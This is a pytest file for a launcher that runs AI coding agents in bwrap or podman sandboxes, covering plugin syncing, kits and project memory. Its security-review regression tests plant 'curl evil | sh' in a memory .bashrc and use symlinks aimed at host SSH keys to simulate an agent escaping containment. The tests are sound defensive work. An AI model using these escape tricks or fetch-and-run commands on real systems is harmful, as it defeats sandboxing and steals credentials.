                    "anthropics/claude-plugins-official": "claude-plugins-official"}.get(args[2], "renamed")
            known[name] = {"source": {}}
        elif status == 0 and args[0] == "install":
            installed["plugins"][args[1]] = [{"scope": "user"}]
        known_path.write_text(json.dumps(known))
        installed_path.write_text(json.dumps(installed))
        return subprocess.CompletedProcess(command, status)


def test_plugins_sync_installs_what_kits_declare_in_a_narrow_sandbox(tmp_path):
    fake, lines = FakeClaude(), []
    assert plugins.sync(["--backend", "bwrap"], out=lines.append, runner=fake) == 0
    adds = [c for c in fake.commands if "add" in c]
    # Each marketplace is fetched with access to its own host only.
    official = next(c for c in adds if "anthropics/claude-plugins-official" in c)
    assert "--allow-github" in official and "--allow-host" not in official
    local = next(c for c in adds if "/sandbox/marketplace" in c)
    assert "--allow-github" not in local
    for command in fake.commands:
        for flag in ("--no-auth", "--no-config", "--no-default-kit", "--no-memory", "--no-plugins"):
            assert flag in command
        assert command[command.index("--binary") + 1] == "claude" and "--backend" in command
        workspace = Path(command[command.index("--workspace") + 1])
        assert workspace.parent == k.plugin_store("claude").parent and not workspace.exists()
    assert [c[-1] for c in fake.commands if "install" in c] == ["sandcastle@sandbox-ai"]
    assert k.plugin_store("claude").stat().st_mode & 0o777 == 0o700
    # Nothing to do the second time.
    again = FakeClaude()
    assert plugins.sync(out=lines.append, runner=again) == 0 and again.commands == []


def test_egm_is_offered_pinned_but_not_enabled_by_default():
    manifest = json.loads((k.MARKETPLACE / ".claude-plugin/marketplace.json").read_text())
    entry = next(e for e in manifest["plugins"] if e["name"] == "egm")
    # A full commit: what is installed only changes when sandbox-ai moves the pin.
    assert entry["source"]["source"] == "github" and entry["source"]["repo"] == "google/elephant-goldfish-model"
    assert len(entry["source"]["sha"]) == 40 and set(entry["source"]["sha"]) <= set("0123456789abcdef")
    template = json.loads((k.TEMPLATES / "claude/marketplaces.json").read_text())
    assert "egm@sandbox-ai" not in template["plugins"]


def test_plugins_sync_reaches_github_only_for_a_github_plugin_of_the_own_marketplace(tmp_path):
    make(data() / "kits/egm/claude", {"marketplaces.json": json.dumps({
        "marketplaces": {"sandbox-ai": {"source": {"source": "directory", "path": "/sandbox/marketplace"}}},
        "plugins": ["egm@sandbox-ai"]})})
    fake = FakeClaude()
    assert plugins.sync(out=lambda line: None, runner=fake) == 0
    installs = {c[-1]: c for c in fake.commands if "install" in c}
    assert "--allow-github" in installs["egm@sandbox-ai"] and "--allow-host" not in installs["egm@sandbox-ai"]
    assert "--allow-github" not in installs["sandcastle@sandbox-ai"]
    assert "--allow-github" not in next(c for c in fake.commands if "/sandbox/marketplace" in c)


# --- the built-in kit egm ----------------------------------------------------------------------------

def test_builtin_kit_egm_is_claude_only_and_a_kit_of_the_users_replaces_it(tmp_path):
    assert k.kit_names(k.BUILTIN_KITS) == ["egm", "superpowers"] and k.builtin_kits("claude") == ["egm", "superpowers"]
    assert k.builtin_kits("codex") == k.builtin_kits("opencode") == []
    document = json.loads((k.BUILTIN_KITS / "egm/claude/marketplaces.json").read_text())
    assert document["plugins"] == ["egm@sandbox-ai"]
    # Only marketplaces.json: a CLAUDE.md here would clash with the default kit's memory template.
    assert sorted(p.name for p in (k.BUILTIN_KITS / "egm/claude").iterdir()) == ["marketplaces.json"]
    assert k.kit_path("egm", "claude") == k.BUILTIN_KITS / "egm/claude"
    assert k.available_kits("claude") == ["egm", "superpowers"] and k.available_kits("claude", builtin=False) == []
    assert k.sources(args(tmp_path, "claude", "--kit", "egm"))[-1] == ("kit egm", k.BUILTIN_KITS / "egm/claude")
    for agent in ("codex", "opencode"):
        with pytest.raises(ValueError, match=f"built-in kit egm is not available for {agent} \\(only for claude\\)"):
            k.sources(s.parse_args([agent, "--kit", "egm"]))
    # The user's own kit egm (for that agent) wins.
    make(data() / "kits/egm/claude", {"skills/mine/SKILL.md": "x"})
    assert k.kit_path("egm", "claude") == data() / "kits/egm/claude" and k.builtin_kits("claude") == ["superpowers"]
    assert k.available_kits("claude") == ["egm", "superpowers"]


def test_builtin_kit_egm_plan_and_install_hint(tmp_path):
    k.ensure_default_home("claude")
    plan = s.kit_plan(args(tmp_path, "claude", "--kit", "egm"))
    assert plan["sources"][-1] == {"kit": "kit egm", "path": str(k.BUILTIN_KITS / "egm/claude")}
    assert plan["plugins"]["missing"] == ["sandcastle@sandbox-ai", "egm@sandbox-ai"]
    assert "sandbox-ai" in plan["plugins"]["marketplaces"]
    assert k.install_command(["egm@sandbox-ai"]) == "sandbox-ai plugins claude --kit egm"
    assert k.install_command(["sandcastle@sandbox-ai"]) == "sandbox-ai plugins claude"
    home, notes = tmp_path / "home", []
    home.mkdir()
    s.claude_plugins(home, {}, ["egm@sandbox-ai"], notes)
    assert notes[0].endswith("install them with: sandbox-ai plugins claude --kit egm")
    # Without --kit egm nothing enables it.
    assert "egm@sandbox-ai" not in s.kit_plan(args(tmp_path, "claude"))["plugins"]["missing"]


def test_plugins_sync_installs_the_builtin_kit_only_on_request(tmp_path, monkeypatch):
    fake = FakeClaude()
    assert plugins.sync(out=lambda line: None, runner=fake) == 0
    assert "egm@sandbox-ai" not in [c[-1] for c in fake.commands]
    fake = FakeClaude()
    assert plugins.sync(out=lambda line: None, runner=fake, builtin=["egm"]) == 0
    install = next(c for c in fake.commands if c[-1] == "egm@sandbox-ai")
    assert "--allow-github" in install and "--kit" not in install
    with pytest.raises(ValueError, match="no built-in kit of that name for claude \\(built-in: egm, superpowers\\)"):
        plugins.sync(out=lambda line: None, runner=FakeClaude(), builtin=["nope"])
    lines = []
    plugins.status(lines.append)
    assert any("built-in kit egm (--kit egm): egm@sandbox-ai" in line and "->" not in line for line in lines)
    # The command line: --kit is sandbox-ai plugins' own, not handed to the store sandbox.
    seen = []
    monkeypatch.setattr(plugins, "sync", lambda options, update, builtin=(), marketplaces_only=False:
                        seen.append((options, builtin, marketplaces_only)) or 0)
    assert plugins.cli(["claude", "--kit", "egm", "--backend", "bwrap"]) == 0
    assert plugins.cli(["claude", "--marketplaces-only"]) == 0
    assert seen == [(["--backend", "bwrap"], ["egm"], False), ([], [], True)]
    ran = []
    monkeypatch.setattr(plugins.subprocess, "run", lambda command: ran.append(command)
                        or subprocess.CompletedProcess(command, 0))
    assert plugins.cli(["claude", "--kit", "egm", "--", "update", "egm@sandbox-ai"]) == 0
    assert "--allow-github" in ran[0] and "--kit" not in ran[0]


def test_plugins_status_names_an_uninstalled_builtin_kit():
    lines = []
    plugins.status(lines.append)
    assert any("built-in kit egm (--kit egm): egm@sandbox-ai (not installed) -> sandbox-ai plugins claude --kit egm"
               in line for line in lines)


def test_plugins_sync_reports_failures_and_renamed_marketplaces(tmp_path):
    k.ensure_default_home("claude")
    make(data() / "kits/x/claude", {"marketplaces.json": json.dumps({
        "marketplaces": {"theirs": {"source": {"source": "git", "url": "https://git.example.org/m.git"}}},
        "plugins": ["tool@theirs"]})})
    fake, lines = FakeClaude(fail={"marketplace add anthropics/claude-plugins-official"}), []
    assert plugins.sync(out=lines.append, runner=fake) == 1
    theirs = next(c for c in fake.commands if "https://git.example.org/m.git" in c)
    assert theirs[theirs.index("--allow-host") + 1] == "git.example.org"
    assert any("is not called theirs" in line for line in lines)
    assert any("not installed: tool@theirs, marketplace claude-plugins-official" in line for line in lines)


def test_a_plugin_missing_from_a_stale_marketplace_copy_is_installed_after_updating_it():
    """Claude installs from its copy of a marketplace's plugin list: an older copy without the plugin answers
    "not found in marketplace"; the marketplace is then updated once and the install tried again."""
    class Stale(FakeClaude):
        updated = False

        def __call__(self, command):
            args = command[command.index("--", command.index("--state-dir")) + 1:][1:]
            if args[:2] == ["marketplace", "update"]:
                self.updated = True
            if args[:1] == ["install"] and not self.updated:
                self.commands.append(command)
                return subprocess.CompletedProcess(command, 1)
            return super().__call__(command)

    fake, lines = Stale(), []
    assert plugins.sync(out=lines.append, runner=fake) == 0
    steps = [c[c.index("plugin") + 1:] for c in fake.commands]
    assert steps[-3:] == [["install", "sandcastle@sandbox-ai"], ["marketplace", "update", "sandbox-ai"],
                          ["install", "sandcastle@sandbox-ai"]]
    assert any("updating the marketplace sandbox-ai and trying sandcastle@sandbox-ai again" in line for line in lines)
    assert not any("not installed" in line for line in lines)


def test_plugins_update_and_passthrough(tmp_path, monkeypatch):
    plugins.sync(out=lambda line: None, runner=FakeClaude())
    fake = FakeClaude()
    assert plugins.sync(update=True, out=lambda line: None, runner=fake) == 0
    assert ["marketplace", "update"] == fake.commands[0][-2:] and fake.commands[-1][-2:] == ["update",
                                                                                            "sandcastle@sandbox-ai"]
    seen = []
    monkeypatch.setattr(plugins.subprocess, "run", lambda command: seen.append(command)
                        or subprocess.CompletedProcess(command, 0))
    assert plugins.cli(["claude", "--", "list"]) == 0 and seen[0][-2:] == ["plugin", "list"]
    assert plugins.cli(["codex"]) == 1


def test_plugins_status(capsys):
    lines = []
    assert plugins.status(lines.append) == 0
    text = "\n".join(lines)
    assert "plugins: none" in text and "opencode  npm plugins" in text and "codex     plugins: not supported" in text
    k.ensure_default_home("claude")
    lines.clear()
    plugins.status(lines.append)
    assert any("home: sandcastle@sandbox-ai (not installed)" in line for line in lines)
    assert any("-> sandbox-ai plugins claude" in line for line in lines)


def test_plugins_store_symlink_refused(tmp_path):
    k.plugin_store("claude").parent.mkdir(parents=True)
    k.plugin_store("claude").symlink_to(tmp_path, target_is_directory=True)
    with pytest.raises(ValueError, match="symlink"):
        plugins.run_in_store(["list"], runner=FakeClaude())


# --- doctor ----------------------------------------------------------------------------------------

def test_doctor_shows_kits_plugins_and_memory(tmp_path):
    assert doctor.check_kit("claude")[0] == "skip"
    k.ensure_default_home("claude")
    status, _, detail, _ = doctor.check_kit("claude")
    assert status == "ok" and "1 skills (sandbox-example)" in detail and "CLAUDE.md" in detail
    assert doctor.check_kits()[0] == "skip"
    make(data() / "kits/review/codex", {"prompts/r.md": "x", "skills/s/SKILL.md": "x"})
    status, _, detail, _ = doctor.check_kits()
    assert status == "ok" and detail == "review/codex: 1 skills (s); 1 prompts (r.md)"
    status, _, detail, hint = doctor.check_plugins()
    assert status == "warn" and "sandcastle@sandbox-ai" in detail and hint == "sandbox-ai plugins claude"
    plugins.sync(out=lambda line: None, runner=FakeClaude())
    assert doctor.check_plugins()[0] == "ok"
    assert doctor.check_memory(tmp_path)[0] == "skip"
    home = tmp_path / "h"
    home.mkdir()
    k.memory_prepare("claude", tmp_path.resolve(), home, ("t", k.TEMPLATES / "claude/CLAUDE.md"))
    status, _, detail, _ = doctor.check_memory(tmp_path)
    assert status == "ok" and "claude: 1 file(s) (CLAUDE.md)" in detail
    make(data() / "kits/broken/claude", {"skills": "not a directory"})
    assert doctor.check_kits()[0] == "warn"


# --- wizard ----------------------------------------------------------------------------------------

class Prompter:
    def __init__(self, answers):
        self.answers, self.lines, self.questions = list(answers), [], []

    def out(self, line):
        self.lines.append(line)

    def ask(self, question, default=None):
        self.questions.append(question)
        answer = self.answers.pop(0)
        return default or "" if answer == "" else answer

    def yes(self, question, default=False):
        self.questions.append(question)
        answer = self.answers.pop(0)
        return default if answer == "" else answer == "y"


def test_wizard_new_configuration_offers_kits_only_when_there_are_some():
    p = Prompter([])
    assert wizard.ask_new_kits(p, "codex") == [] and p.questions == []
    assert "project memory on" in p.lines[0]
    # Claude has the built-in kit egm: named, not asked for, while the user has no kits of their own.
    p = Prompter([])
    assert wizard.ask_new_kits(p, "claude") == [] and p.questions == []
    assert "Built-in kits for claude: egm, superpowers; choose them later with: sandbox-ai wizard edit, part k" in p.lines[1]
    make(data() / "kits/review/claude", {"skills/a/SKILL.md": "x"})
    make(data() / "kits/python/codex", {"skills/a/SKILL.md": "x"})
    p = Prompter(["nope, review", "review, egm"])
    assert wizard.ask_new_kits(p, "claude") == ["--kit", "review", "--kit", "egm"]
    assert "available for claude: egm (built-in), review, superpowers (built-in))" in p.questions[0]
    assert any("No kit 'nope'" in l for l in p.lines)


def test_wizard_edit_kits_round_trip(tmp_path):
    make(data() / "kits/review/claude", {"skills/a/SKILL.md": "x"})
    current = ["--kit", "review", "--kit-dir", "/opt/kit", "--no-memory", "--no-plugins"]
    # Keep everything as it is: default kit (on), kits, kit dir, memory question, plugins off.
    p = Prompter(["", "", "", "", ""])
    assert wizard.ask_kits(p, "claude", current) == current
    # Switch the default kit off, drop the kits, turn memory back on.
    p = Prompter(["n", "-", "n", "y", "n"])
    assert wizard.ask_kits(p, "claude", current) == ["--no-default-kit"]
    document = {"version": 1, "agent": "claude", "options": ["--no-tmux", *current], "workspaces": []}
    answers, notes = wizard.answers_from_document(document)
    assert answers["kits"] == current and notes == [] and answers["extra"] == []
    assert wizard.build_document(answers)["options"][-len(current):] == current
    assert ("k", "Kits and project memory", "--kit review --kit-dir /opt/kit --no-memory --no-plugins") in \
        wizard.summary(answers)
    # A relative --kit-dir in a project file is refused like every other path option.
    assert s.relative_paths(["--kit-dir", "kits"]) == ["--kit-dir kits"]


# --- whole runs through main() with a fake backend ---------------------------------------------------

@pytest.mark.parametrize("backend", ("podman", "bwrap"))
def test_run_mounts_kits_read_only_and_keeps_project_memory(backend, tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(s.os, "geteuid", lambda: 1000)
    tool = tmp_path / "bin"
    tool.mkdir()
    for name in ("claude", "podman", "bwrap", "firejail", "nft", "setpriv", "newuidmap", "newgidmap", "slirp4netns"):
        (tool / name).write_text("#!/bin/sh\n")
        (tool / name).chmod(0o755)
    monkeypatch.setattr(s.shutil, "which", lambda name: str(tool / name) if (tool / name).exists() else None)
    monkeypatch.setattr(s, "check_tiocsti", lambda: None)
    monkeypatch.setattr(s, "has_controlling_terminal", lambda: False)
    make(data() / "kits/review/claude", {"skills/review/SKILL.md": "---\nname: review\n---\n",
                                         "agents/reviewer.md": "r"})
    seen = []

    def run(a, session, home):
        mounts = {dest: (Path(src), mode) for src, dest, mode in a.kit_mounts}
        assert all(mode == "ro" for _, mode in mounts.values())
        skills = mounts["/root/.claude/skills"][0]
        assert sorted(p.name for p in skills.iterdir()) == ["review", "sandbox-ai", "sandbox-example"]
        assert (mounts["/root/.claude/agents"][0] / "reviewer.md").read_text() == "r"
        assert mounts["/sandbox/marketplace"][0] == k.MARKETPLACE
        # The backend gets the same mounts on its command line.
        a.runtime = []  # the fake agent lies outside the directories --runtime accepts
        command = s.pod_commands(a, "x", session, home)[1] if backend == "podman" else s.bwrap_command(a, session, home)
        joined = " ".join(map(str, command))
        assert f"src={skills},dst=/root/.claude/skills,ro" in joined if backend == "podman" else \
            f"--ro-bind {skills} /root/.claude/skills" in joined
        # The agent learns something and changes its memory file.
        seen.append((home / ".claude/CLAUDE.md").read_text())
        make(home, {".claude/projects/-work/memory/MEMORY.md": f"run {len(seen)}"})
        (home / ".claude/CLAUDE.md").write_text(f"notes after run {len(seen)}")
        return 0

    monkeypatch.setattr(s, "run_pod" if backend == "podman" else "run_bwrap", run)
    argv = ["claude", "--backend", backend, "--workspace", str(tmp_path / "work"), "--offline", "--no-auth",
            "--kit", "review"]
    assert s.main(argv) == 0
    assert s.main(argv) == 0
    # The second run starts with what the first one learned; the kit's template was used once.
    assert seen == [(k.TEMPLATES / "claude/CLAUDE.md").read_text(), "notes after run 1"]
    store = k.memory_store(Path(tmp_path / "work").resolve(), "claude")
    assert (store / ".claude/projects/-work/memory/MEMORY.md").read_text() == "run 2"
    assert (data() / "home/claude/CLAUDE.md").read_text() == (k.TEMPLATES / "claude/CLAUDE.md").read_text()
    err = capsys.readouterr().err
    assert "created the default kit" in err and "file(s) kept in" in err
    assert "sandcastle@sandbox-ai; install them with: sandbox-ai plugins claude" in err


def test_run_without_kits_and_memory(tmp_path, monkeypatch):
    monkeypatch.setattr(s.os, "geteuid", lambda: 1000)
    tool = tmp_path / "bin"
    tool.mkdir()
    (tool / "podman").write_text("")
    monkeypatch.setattr(s.shutil, "which", lambda name: str(tool / name) if name == "podman" else None)

    def run(a, session, home):
        assert a.kit_mounts == []  # Codex: no default kit (nor the built-in skill), no kits, no marketplace
        assert not (home / ".codex/AGENTS.md").exists()
        return 0
    monkeypatch.setattr(s, "run_pod", run)
    assert s.main(["codex", "--workspace", str(tmp_path / "work"), "--offline", "--no-auth", "--no-default-kit",
                   "--no-memory"]) == 0
    assert not (data() / "home").exists() and not (Path(os.environ["HOME"]) / ".local/state/sandbox-ai/memory").exists()


def test_login_and_mcp_sandboxes_get_no_kits(tmp_path, monkeypatch):
    login = load("login_for_kits_tests", "sandbox/login.py")
    seen = []
    monkeypatch.setattr(login.subprocess, "run", lambda command: seen.append(command)
                        or subprocess.CompletedProcess(command, 1))
    login.login("claude", out=lambda line: None)
    for flag in ("--no-default-kit", "--no-memory", "--no-plugins"):
        assert flag in seen[0]
    mcp = load("mcp_for_kits_tests", "sandbox/mcp.py")
    assert {"--kit", "--kit-dir"} <= set(mcp.forbidden())


def test_dry_run_shows_the_plan_and_creates_nothing(tmp_path, capsys):
    assert s.launch(["claude", "--workspace", str(tmp_path / "work"), "--no-auth", "--dry-run"]) == 0
    plan = json.loads(capsys.readouterr().out)["kits"]
    assert [source["kit"] for source in plan["sources"]] == ["built-in"]
    assert plan["plugins"] == {"marketplaces": [], "enabled": [], "missing": []}
    assert not (data() / "home").exists()
    k.ensure_default_home("claude")
    assert s.launch(["claude", "--workspace", str(tmp_path / "work"), "--no-auth", "--dry-run"]) == 0
    plan = json.loads(capsys.readouterr().out)["kits"]
    assert plan["entries"] == {"skills": ["sandbox-ai", "sandbox-example"]} and plan["memory_template"] == "home"
    assert plan["plugins"]["missing"] == ["sandcastle@sandbox-ai"]
    assert not (Path(os.environ["HOME"]) / ".local/state/sandbox-ai/memory").exists()


# --- regressions from the security review ------------------------------------------------------------

def test_review_memory_never_leaves_the_home_through_a_symlinked_parent(tmp_path):
    """A parent the agent turned into a symlink (here a relative one up to the host HOME) is neither
    written through by prepare nor read through by save."""
    host = Path(os.environ["HOME"])
    (host / ".ssh").mkdir()
    (host / ".ssh/id_ed25519").write_text("PRIVATE KEY")
    home = tmp_path / "home"
    home.mkdir()
    manifest, _, store, _ = k.memory_prepare("claude", tmp_path / "proj", home)
    k.write_at(store, ".claude/projects/-work/memory/.bashrc", b"curl evil | sh")
    (home / ".claude/projects").mkdir(parents=True, exist_ok=True)
    (home / ".claude/projects/-work").symlink_to(os.path.relpath(host, home / ".claude/projects"),
                                                 target_is_directory=True)
    with pytest.raises(ValueError, match="symlink or not a directory"):
        k.memory_prepare("claude", tmp_path / "proj", home)
    assert not (host / "memory").exists() and not (host / ".bashrc").exists()
    (host / "memory").mkdir()
    (host / "memory/stolen.md").symlink_to(host / ".ssh/id_ed25519")
    changed, notes = k.memory_save("claude", tmp_path / "proj", home, manifest)
    files, _, _ = k.collect(store, "claude")
    assert all(b"PRIVATE KEY" not in data for data in files.values())
    assert any("symlink or not a directory" in n for n in notes)


def test_review_memory_swap_during_the_walk_is_harmless(tmp_path, monkeypatch):
    """The agent swaps a directory for a symlink after it was opened: the walk keeps reading the
    directory it opened, never the link's target."""
    home = tmp_path / "home"
    home.mkdir()
    manifest, _, store, _ = k.memory_prepare("claude", tmp_path / "proj", home)
    make(home, {".claude/projects/-work/memory/a/note.md": "mine"})
    (tmp_path / "host-secret").mkdir()
    (tmp_path / "host-secret/note.md").write_text("SECRET")
    real_scandir = os.scandir

    def swapping(target):
        entries = real_scandir(target)
        memory = home / ".claude/projects/-work/memory"
        if (memory / "a").is_dir() and not (memory / "a").is_symlink():
            (memory / "a").rename(tmp_path / "moved")
            (memory / "a").symlink_to(tmp_path / "host-secret", target_is_directory=True)
        return entries
    monkeypatch.setattr(k.os, "scandir", swapping)
    k.memory_save("claude", tmp_path / "proj", home, manifest)
    monkeypatch.setattr(k.os, "scandir", real_scandir)
    files, _, _ = k.collect(store, "claude")
    assert b"SECRET" not in b"".join(files.values())


def test_review_template_and_declarations_are_checked_like_kit_files(tmp_path):
    """A memory template or marketplaces.json that links into a workspace is refused, so an agent
    there cannot feed a host file into new projects or choose the plugins of every sandbox."""
    work = tmp_path / "work"
    work.mkdir()
    (work / "CLAUDE.md").write_text("planted")
    (data() / "home/claude").mkdir(parents=True)
    (data() / "home/claude/CLAUDE.md").symlink_to(work / "CLAUDE.md")
    a = args(tmp_path, "claude")
    home = tmp_path / "home"
    home.mkdir()
    with pytest.raises(ValueError, match="agent can change"):
        s.prepare_kits(a, home, tmp_path / "staging")
    assert not k.memory_store(work, "claude").exists()
    (data() / "home/claude/CLAUDE.md").unlink()
    (work / "marketplaces.json").write_text("{}")
    (data() / "home/claude/marketplaces.json").symlink_to(work / "marketplaces.json")
    with pytest.raises(ValueError, match="agent can change"):
        s.prepare_kits(a, home, tmp_path / "staging2")


def test_review_store_limits_hold_for_the_merged_result(tmp_path, monkeypatch):
    monkeypatch.setattr(k, "MEMORY_FILES", 4)
    homes = [tmp_path / "a", tmp_path / "b"]
    manifests = []
    for home in homes:
        home.mkdir()
        manifests.append(k.memory_prepare("claude", tmp_path / "proj", home)[0])
    for index, home in enumerate(homes):
        make(home, {f".claude/projects/-work/memory/{index}-{n}.md": "x" for n in range(3)})
    k.memory_save("claude", tmp_path / "proj", homes[0], manifests[0])
    changed, notes = k.memory_save("claude", tmp_path / "proj", homes[1], manifests[1])
    assert changed == 1 and sum("project memory is full" in n for n in notes) == 2
    files, _, complete = k.collect(k.memory_store(tmp_path / "proj", "claude"), "claude")
    assert len(files) == 4 and complete
    # Later starts still work.
    (tmp_path / "c").mkdir()
    assert len(k.memory_prepare("claude", tmp_path / "proj", tmp_path / "c")[0]) == 4


def test_review_file_and_directory_of_one_name_lose_nothing_else(tmp_path):
    c, d = tmp_path / "c", tmp_path / "d"
    c.mkdir(), d.mkdir()
    mc = k.memory_prepare("claude", tmp_path / "proj", c)[0]
    md = k.memory_prepare("claude", tmp_path / "proj", d)[0]
    make(c, {".claude/projects/-work/memory/topic": "file"})
    make(d, {".claude/projects/-work/memory/a.md": "a", ".claude/projects/-work/memory/topic/z.md": "z",
             ".claude/projects/-work/memory/zz.md": "zz"})
    k.memory_save("claude", tmp_path / "proj", c, mc)
    changed, notes = k.memory_save("claude", tmp_path / "proj", d, md)
    files, _, _ = k.collect(k.memory_store(tmp_path / "proj", "claude"), "claude")
    assert files[".claude/projects/-work/memory/topic"] == b"file"
    assert files[".claude/projects/-work/memory/a.md"] == b"a" and files[".claude/projects/-work/memory/zz.md"] == b"zz"
    assert changed == 2 and any("topic/z.md not kept" in n for n in notes)
    # And the other way round: a file never replaces a directory another sandbox saved.
    e = tmp_path / "e"
    e.mkdir()
    me = k.memory_prepare("claude", tmp_path / "p2", e)[0]
    f = tmp_path / "f"
    f.mkdir()
    mf = k.memory_prepare("claude", tmp_path / "p2", f)[0]
    make(e, {".claude/projects/-work/memory/dir/keep.md": "keep"})
    k.memory_save("claude", tmp_path / "p2", e, me)
    make(f, {".claude/projects/-work/memory/dir": "file"})
    changed, notes = k.memory_save("claude", tmp_path / "p2", f, mf)
    files, _, _ = k.collect(k.memory_store(tmp_path / "p2", "claude"), "claude")
    assert files == {".claude/projects/-work/memory/dir/keep.md": b"keep"} and changed == 0


def test_review_unsaved_memory_of_a_persistent_home_is_recovered(tmp_path):
    home = tmp_path / "state"
    home.mkdir()
    k.memory_prepare("codex", tmp_path / "proj", home, persistent=True)
    make(home, {".codex/AGENTS.md": "learned before the crash"})
    # No save: the launcher died. The next start of the same HOME keeps those changes.
    _, _, store, notes = k.memory_prepare("codex", tmp_path / "proj", home, persistent=True)
    assert (store / ".codex/AGENTS.md").read_text() == "learned before the crash"
    assert (home / ".codex/AGENTS.md").read_text() == "learned before the crash"
    assert any("had not saved" in n for n in notes)
    # A throwaway HOME is never recovered from: its missing files would look deleted.
    other = tmp_path / "tmp-home"
    other.mkdir()
    k.memory_prepare("codex", tmp_path / "proj", other)
    import shutil
    shutil.rmtree(other)
    k.memory_prepare("codex", tmp_path / "proj", tmp_path / "state", persistent=True)
    assert (store / ".codex/AGENTS.md").read_text() == "learned before the crash"
    assert len(list(store.parent.glob(".pending-*"))) == 1  # the stale record is gone


def test_review_bad_template_leaves_no_empty_store(tmp_path, monkeypatch):
    monkeypatch.setattr(k, "TEMPLATE_LIMIT", 4)
    template = make(tmp_path / "kit", {"AGENTS.md": "too long"}) / "AGENTS.md"
    home = tmp_path / "home"
    home.mkdir()
    with pytest.raises(ValueError, match="larger than"):
        k.memory_prepare("codex", tmp_path / "proj", home, ("kit", template))
    assert not k.memory_store(tmp_path / "proj", "codex").exists()
    monkeypatch.setattr(k, "TEMPLATE_LIMIT", 1 << 20)
    k.memory_prepare("codex", tmp_path / "proj", home, ("kit", template))
    assert (home / ".codex/AGENTS.md").read_text() == "too long"


def test_review_doctor_survives_broken_stores(tmp_path, monkeypatch):
    store = data() / "plugins/claude/.claude/plugins"
    store.mkdir(parents=True)
    (store / "installed_plugins.json").write_bytes(b" " * (5 << 20))
    assert doctor.check_plugins()[0] in ("ok", "warn")
    monkeypatch.setattr(k, "collect", lambda *a: (_ for _ in ()).throw(PermissionError("denied")))
    monkeypatch.setattr(doctor, "kits", lambda: k)
    k.memory_store(tmp_path.resolve(), "claude").mkdir(parents=True)
    assert doctor.check_memory(tmp_path)[0] == "warn"


def test_review_plugin_store_with_a_planted_symlink_is_ignored(tmp_path):
    (tmp_path / "host-claude/plugins/cache").mkdir(parents=True)
    (tmp_path / "host-claude/plugins/installed_plugins.json").write_text(json.dumps({"plugins": {"x@y": []}}))
    k.plugin_store("claude").mkdir(parents=True)
    (k.plugin_store("claude") / ".claude").symlink_to(tmp_path / "host-claude", target_is_directory=True)
    assert k.plugin_dir() is None and k.installed() == ({}, {})
    home = tmp_path / "home"
    home.mkdir()
    assert s.claude_plugins(home, {}, ["x@y"], []) == []


def test_review_agent_trees_inside_a_store_are_refused(tmp_path):
    for path in (k.plugin_store("claude") / ".claude/plugins/cache/x", data() / "home/claude/skills",
                 Path(os.environ["HOME"]) / ".local/state/sandbox-ai/memory/p"):
        path.mkdir(parents=True, exist_ok=True)
        with pytest.raises(ValueError, match="lies inside|lies in "):
            s.validate(s.parse_args(["claude", "--workspace", str(path), "--no-auth"]))
    # The plugin store's own sandbox (--no-plugins, store as HOME) is fine.
    s.validate(s.parse_args(["claude", "--workspace", str(tmp_path / "w"), "--no-auth", "--no-plugins",
                             "--no-default-kit", "--no-memory", "--state-dir", str(k.plugin_store("claude"))]))


def test_review_small_ones(tmp_path):
    with pytest.raises(ValueError, match="sandbox-ai fills .claude/skills"):
        s.validate(s.parse_args(["claude", "--workspace", str(tmp_path / "w"), "--no-auth",
                                 "--copy", f"{tmp_path}/f:.claude/x/../skills/f"]))
    with pytest.raises(ValueError, match="OWNER/REPO"):
        k.check_source("m", {"source": "github", "repo": "../.."})
    long = tmp_path / ("x" * 250)
    assert len(k.memory_store(long, "claude").parent.name) <= 255



def test_builtin_skill_ships_for_every_agent_and_a_kit_can_replace_it(tmp_path):
    for agent in k.AGENTS:
        text = (k.BUILTIN / agent / "skills/sandbox-ai/SKILL.md").read_text()
        assert text.startswith("---\nname: sandbox-ai\ndescription: ") and "sandbox-ai net allow" in text
        assert k.MEMORY_FILE[agent][1] in text
    make(tmp_path / "mine/claude", {"skills/sandbox-ai/SKILL.md": "---\nname: sandbox-ai\n---\nmine"})
    plan = k.scan("claude", k.sources(args(tmp_path, "claude", "--kit-dir", str(tmp_path / "mine"))))
    label, path = plan["entries"]["skills"]["sandbox-ai"]
    assert label.startswith("kit-dir") and (path / "SKILL.md").read_text().endswith("mine")
    assert any("replaces the built-in one" in note for note in plan["notes"])


def test_superpowers_is_offered_pinned_with_a_built_in_kit_but_not_by_default():
    manifest = json.loads((k.MARKETPLACE / ".claude-plugin/marketplace.json").read_text())
    entry = next(e for e in manifest["plugins"] if e["name"] == "superpowers")
    assert entry["source"] == {"source": "github", "repo": "obra/superpowers",
                               "sha": "22f0b463e7a5e579904dd6211a520321035526f7"}  # the commit of tag v7.0.2
    assert entry["license"] == "MIT" and entry["version"] == "7.0.2"
    kit = json.loads((k.BUILTIN_KITS / "superpowers/claude/marketplaces.json").read_text())
    assert kit["plugins"] == ["superpowers@sandbox-ai"] and set(kit["marketplaces"]) == {"sandbox-ai"}
    assert "superpowers@sandbox-ai" not in json.loads((k.TEMPLATES / "claude/marketplaces.json").read_text())["plugins"]
    assert "superpowers" in k.builtin_kits("claude") and "superpowers" not in k.builtin_kits("codex")
